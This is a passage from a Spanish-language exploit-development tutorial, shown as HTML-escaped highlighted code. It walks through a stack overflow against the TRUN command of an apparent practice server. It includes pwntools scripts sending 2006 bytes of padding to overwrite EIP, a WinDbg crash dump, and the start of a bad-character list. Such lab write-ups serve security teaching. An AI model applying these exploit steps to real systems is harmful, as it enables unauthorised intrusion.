&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TRUN . &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;send&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En el volcado de winDBG, vemos que hemos provocado una violación de acceso, para comprobar la parte del patrón que es, podemos usar &lt;code&gt;msfpattern&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(190c.2040): Access violation - code c0000005 (first chance)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;First chance exceptions are reported before any exception handling.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;This exception may be expected and handled.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00d7f1e8 ebx=000000e0 ecx=00b75370 edx=0000f50c esi=00401848 edi=00401848
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=396f4338 esp=00d7f9c8 ebp=6f43376f iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;396f4338 ??              ???
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Después de obtener el offset exacto &lt;code&gt;0x396f4338 = 2006&lt;&#x2F;code&gt;, debemos comprobar que tenemos el control total del registro EIP.&lt;&#x2F;p&gt;
&lt;p&gt;Si todo va bien, EIP, tendrá 4 &lt;code&gt;B&#x27;s&lt;&#x2F;code&gt; y después &lt;code&gt;ESP&lt;&#x2F;code&gt; contendrá todas las &lt;code&gt;C&#x27;s&lt;&#x2F;code&gt; que se mandan, ya que este parámetro no tiene restricciones de espacio.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;pwn&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-constant z-language z-import-all z-python&quot;&gt;*&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;remote&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;192.168.1.131&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;9999&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x41&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2006&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; junk
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x42&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;4&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; eip
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x43&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-group z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;3000&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;len&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; filler
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TRUN .&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;send&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Una vez comprobado que tenemos el control EIP contendrá las 4&#x27;Bs , a continuación tenemos que ver que caracteres no interpreta de manera correcta la aplicación en el registro &lt;code&gt;ESP&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;¿Pero porqué &lt;code&gt;ESP&lt;&#x2F;code&gt;?, lo  siguiente que va a ejecutar &lt;code&gt;EIP&lt;&#x2F;code&gt; es lo que está en &lt;code&gt;ESP&lt;&#x2F;code&gt;, ya que define el puntero de pila.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;buscando-badchars&quot;&gt;Buscando badchars&lt;a class=&quot;zola-anchor&quot; href=&quot;#buscando-badchars&quot; aria-label=&quot;Anchor link for: buscando-badchars&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;pwn&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-constant z-language z-import-all z-python&quot;&gt;*&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;remote&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;192.168.1.131&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;9999&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;badchars&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x01&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x02&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x03&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x04&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x05&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x06&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x07&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x08&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x09&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x10&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x11&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x12&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x13&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x14&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x15&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x16&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x17&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x18&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x19&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x20&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x21&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x22&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x23&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x24&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x25&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x26&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x27&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x28&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x29&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x30&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x31&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x32&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x33&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x34&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x35&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x36&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x37&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x38&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x39&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x40&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x41&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape 